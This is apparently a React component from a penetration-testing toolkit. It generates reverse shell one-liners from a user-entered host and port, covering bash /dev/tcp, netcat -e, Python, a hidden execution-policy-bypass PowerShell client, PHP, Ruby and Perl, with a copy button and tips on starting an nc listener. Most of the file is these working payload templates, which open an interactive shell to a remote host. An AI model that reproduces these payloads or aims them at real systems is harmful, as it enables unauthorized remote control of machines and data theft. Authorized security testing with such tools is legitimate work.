import { useState } from 'react';
import { motion } from 'framer-motion';
import { FaCopy } from 'react-icons/fa';
import { toast } from 'react-toastify';
import './UtilityTools.css';

const ReverseShellGenerator = () => {
  const [lhost, setLhost] = useState('');
  const [lport, setLport] = useState('4444');
  const [shellType, setShellType] = useState('bash');
  const [output, setOutput] = useState('');

  const shells = {
    bash: `bash -i >& /dev/tcp/${lhost}/${lport} 0>&1`,
    nc: `nc ${lhost} ${lport} -e /bin/bash`,
    ncAlt: `nc -e /bin/bash ${lhost} ${lport}`,
    python: `python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("${lhost}",${lport}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'`,
    python3: `python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("${lhost}",${lport}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'`,
    powershell: `powershell -NoP -NonI -W Hidden -Exec Bypass -Command $client = New-Object System.Net.Sockets.TCPClient('${lhost}',${lport});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()`,
    php: `php -r '$sock=fsockopen("${lhost}",${lport});exec("/bin/bash -i <&3 >&3 2>&1");'`,
    ruby: `ruby -rsocket -e 'exit if fork;c=TCPSocket.new("${lhost}","${lport}");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'`,
    perl: `perl -e 'use Socket;$i="${lhost}";$p=${lport};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'`,
  };

  const generateShell = () => {
    if (!lhost || !lport) {
      toast.warning('Please enter both LHOST and LPORT');
      return;
    }

    if (shellType === 'nc' || shellType === 'ncAlt') {
      const shellCmd = shells[shellType];
      setOutput(shellCmd);
      toast.success('Shell command generated!');
    } else {
      const shellCmd = shells[shellType];
      setOutput(shellCmd);
      toast.success('Shell command generated!');
    }
  };

  const copyToClipboard = (text) => {
    navigator.clipboard.writeText(text);
    toast.success('Copied to clipboard!');
  };

  const handleKeyPress = (e) => {
    if (e.key === 'Enter') {
      generateShell();
    }
  };

  return (
    <div className="utility-tool">
      <div className="shell-config">
        <div className="config-input">
          <label>LHOST (Your IP)</label>
          <input
            type="text"
            value={lhost}
            onChange={(e) => setLhost(e.target.value)}
            placeholder="192.168.1.1"
            onKeyPress={handleKeyPress}
          />
        </div>

        <div className="config-input">
          <label>LPORT (Your Port)</label>
          <input
            type="text"
            value={lport}
            onChange={(e) => setLport(e.target.value)}
            placeholder="4444"
            onKeyPress={handleKeyPress}
          />
        </div>

        <div className="config-input">
          <label>Shell Type</label>
          <select
            value={shellType}
            onChange={(e) => setShellType(e.target.value)}
          >
            <option value="bash">Bash</option>
            <option value="nc">Netcat (-e)</option>
            <option value="ncAlt">Netcat (Alt)</option>
            <option value="python">Python</option>
            <option value="python3">Python3</option>
            <option value="powershell">PowerShell</option>
            <option value="php">PHP</option>
            <option value="ruby">Ruby</option>
            <option value="perl">Perl</option>
          </select>
        </div>

        <motion.button
          onClick={generateShell}
          className="generate-btn"
          whileHover={{ scale: 1.05 }}
          whileTap={{ scale: 0.95 }}
        >
          Generate Shell
        </motion.button>
      </div>

      {output && (
        <div className="utility-section">
          <label>Generated Command</label>
          <textarea
            value={output}
            readOnly
            className="utility-textarea"
            rows={6}
          />
          <motion.button
            onClick={() => copyToClipboard(output)}
            className="copy-btn"
            whileHover={{ scale: 1.05 }}
            whileTap={{ scale: 0.95 }}
          >
            <FaCopy /> Copy Command
          </motion.button>
        </div>
      )}

      <div className="utility-tips">
        <h4>Tips:</h4>
        <ul>
          <li>Always set up a listener first: nc -nvlp 4444</li>
          <li>Replace LHOST with your actual IP address</li>
          <li>Configure LPORT to match your listener port</li>
          <li>Bash and Python shells require respective interpreters</li>
          <li>PowerShell shells work on Windows systems</li>
          <li>Test payload in authorized environment only</li>
        </ul>
      </div>
    </div>
  );
};

export default ReverseShellGenerator;
